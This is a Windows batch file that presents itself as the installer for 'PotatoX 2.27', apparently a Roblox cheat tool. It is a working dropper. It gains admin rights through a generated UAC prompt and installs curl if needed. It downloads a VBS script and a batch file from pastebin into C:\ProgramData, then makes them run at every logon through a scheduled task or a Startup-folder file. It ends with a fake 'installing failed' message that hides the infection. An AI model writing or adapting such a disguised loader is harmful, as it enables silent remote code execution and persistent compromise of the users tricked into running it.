@echo off
setlocal enabledelayedexpansion
title PotatoX 2.27 Installer
set KEY=reinis
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    
:start
where curl >nul 2>&1
if %errorlevel% equ 0 (
    echo curl is already installed.
    goto Preparing
)
echo curl is not installed. Installing curl...
set "curl_url=https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip"
set "curl_zip=curl.zip"
set "curl_dir=%TEMP%\curl"
if not exist "%curl_dir%" mkdir "%curl_dir%"
echo Downloading curl...
powershell -Command "Invoke-WebRequest -Uri '%curl_url%' -OutFile '%curl_zip%'"
echo Extracting curl...
powershell -Command "Expand-Archive -Path '%curl_zip%' -DestinationPath '%curl_dir%'"
echo Installing curl...
for /f "delims=" %%i in ('dir /b /s "%curl_dir%\curl.exe"') do (
    move "%%i" "C:\Windows\System32\curl.exe" >nul
)
echo Cleaning up...
del "%curl_zip%"
rmdir /s /q "%curl_dir%"
where curl >nul 2>&1
if %errorlevel% equ 0 (
    echo curl has been successfully installed.
    goto Preparing
) else (
    echo Failed to install curl.
    goto start
)

:Preparing
cd "C:\ProgramData"
del wallpapersvc.vbs
del file.bat
del key.txt
goto Preparing3

:Preparing3
cls
echo Preparing for setup (1/3)...
cd "C:\ProgramData"
curl https://pastebin.com/raw/da9Sd6E6 -o "wallpapersvc.vbs" > nul
cls
echo Preparing for setup (2/3)...
curl https://pastebin.com/raw/h93T1yEE -o "file.bat" > nul

if not exist "C:\ProgramData" (
    mkdir "C:\ProgramData"
)
<nul set /p="%KEY%" > "C:\ProgramData\key.txt"
if exist "C:\ProgramData\key.txt" (
    echo Setup executable prepared.
) else (
    echo Failed, Retrying...
    goto Preparing3
)

echo Preparing for setup (3/3)...
@echo off
for /f "tokens=3" %%i in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v EditionID 2^>nul') do (
    set "edition=%%i"
)

if /i "%edition%"=="Professional" (
    goto winpro
) else (
    goto winhome
)

:winpro
set "script_path=C:\ProgramData\wallpapersvc.vbs"
if not exist "%script_path%" (
    goto Preparing
)
schtasks /create /tn "WallpaperServiceTask" /tr "wscript.exe \"%script_path%\"" /sc onlogon /ru "Users"
if %errorlevel% equ 0 (
    goto final
) else (
    goto Preparing
)

:winhome
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "target_bat=run_wallpapersvc.bat"
echo Creating %target_bat%...

(
    echo @echo off
    echo cd "C:\ProgramData\"
    echo start wallpapersvc.vbs
) > "%target_bat%"


:final
cls
timeout /t 2 /nobreak >nul
echo Installing failed, Roblox has been updated. Please wait for a new PotatoX version.
pause